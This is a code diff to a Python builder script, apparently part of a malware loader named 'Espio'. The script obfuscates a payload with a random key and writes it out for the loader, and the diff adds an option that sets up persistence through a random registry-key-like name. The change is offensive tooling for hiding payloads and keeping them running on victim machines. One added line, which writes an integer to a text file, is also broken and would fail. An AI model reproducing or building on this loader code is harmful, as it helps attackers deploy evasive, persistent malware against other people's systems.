@@ -23,6 +23,18 @@ def generate_key():
     key = "".join(random.choices(letters, k=random.randint(100, 500)))
     return key
 
+def persist(output_path):
+    answer = input('[*] Do you want to enable persistence? (Y/N) ').lower()
+    if answer == 'y':
+        letters = [chr(ascii_value) for ascii_value in range(97, 123)]
+        reg_key = "".join(random.choices(letters, k=random.randint(4, 10)))
+        with open (f"{output_path}/persistence.bin", 'w') as persist_file:
+            persist_file.write(reg_key)
+        print("[+] Espio Will persist")
+    else:
+        with open (f"{output_path}/persistence.bin", 'w') as persist_file:
+            persist_file.write(0)
+        print("[*] Persistence will not be created")
 
 def main():
     if len(sys.argv) == 2:
@@ -32,15 +44,16 @@ def main():
             key = generate_key()
             obfuscated_payload = obfuscate_payload(payload, key)
             output_path = "loader/Espio"
-            if os.path.exists("loader/Espio"):
-                print("[+] The key and the payload are placed in loader/Espio")
-            else:
+            path_msg = "[+] The bin files are placed in loader/Espio"
+            if not os.path.exists(output_path):
                 output_path = '.'
-                print("[*] WARNING: loader/Espio was not found! The key and the payload will be placed in the current directory")
+                path_msg = "[*] WARNING: loader/Espio was not found! The bin files will be placed in the current directory"
+            persist(output_path)
             with open(f"{output_path}/key.bin", 'w') as key_file:
                 key_file.write(key)
             with open(f"{output_path}/obfuscatedPayload.bin", 'w') as obfuscated_payload_file:
                 obfuscated_payload_file.write(obfuscated_payload)
+            print(path_msg)
         else:
             print(f"[-] {sys.argv[1]} does not exists!")
     else:
